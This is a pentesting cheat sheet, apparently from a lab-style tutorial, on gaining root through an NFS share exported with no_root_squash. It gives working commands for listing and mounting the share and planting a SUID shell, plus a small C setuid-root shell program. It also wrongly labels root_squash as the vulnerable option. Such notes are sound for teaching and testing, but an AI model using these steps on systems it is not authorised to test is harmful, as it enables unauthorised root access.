#### What is NFS (Network File Shares)
The **Network File Sharing (NFS)** protocol in Linux systems ***allows users to share files, directories, and systems over a network***. NFS enables users to ***access remote systems locally*** when mounted and transfer files to and from machines.

#### NFS Shares
**List NFS shares exported by the target**
```bash
showmount -e <target-ip>
```
- Result can be mounted by any user on the internet.

#### Confirm the Configuration of the NFS server
```bash
cat /etc/exports
```
- `root_squash:` this options is **vulnerable**.

#### Root Squashing
**Root squashing** is an NFS security feature that ***prevents remote root users from having root access on mounted file shares***. Instead, their ***privileges are downgraded*** to the low-privilege `nobody` user, ensuring they can't modify files as root. However, if the NFS share is configured with `no_root_squash`, ***root squashing is disabled***, allowing remote root users full access to the share which can pose a security risk.

#### Privilege Escalation
**Mounting NFS Shares**
To exploit an NFS share with `no_root_squash` enabled, you ***mount the share from your kali machine as root***, giving you ***root-level access*** to the target's shared directory. By mounting it locally (e.g., to `/tmp/<foldername>`), any file operations you perform are reflected directly on the target system's `/usershare` directory.

**Attacker Machine**
`root is required for this task.`
```bash
sudo su
mkdir /tmp/<foldername>
```

**Mount the NFS share onto your directory**
```bash
mount -t nfs <target-ip>:/share /tmp/<foldername>
```

Now, any files you add to `/tmp/<foldername>` will be automatically added to the `/usershare` folder on the target.
- Create a test file inside `/tmp/<foldername>/test`.
- You should see a test file inside `/usershare` on the target machine.

`If there are no files in the directory, there's no privilege escalation route. However, follow the below ...`

#### SUID Binaries
**Move to the mounted directory on your local machine**
```bash
cd /tmp/<foldername>
```

**Copy the `/bin/bash` binary to this directory to launch a shell on the remote system**
```bash
cp /bin/bash ./bash
```

`Using your system's **default Bash binary** may not be compatible with all targets. In that case, create your own binary.`

**C script that launches a shell as the root user (UID 0)**

```c
#include <stdlib.h>
#include <stdio.h> 
#include <sys/types.h> 
#include <unistd.h>
int main(void) { 
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

**Compile the code into an executable**
```bash
gcc -o bash bash.c
```

**Ensure the binary is executable and grant it SUID permissions**
```bash
chmod +x bash
chmod +s bash
```

**Victim Machine**
```bash
cd /usershare
ls -la bash # confirm the file permissions remain the same
```

**Run the Binary**
```bash
./bash -p
```


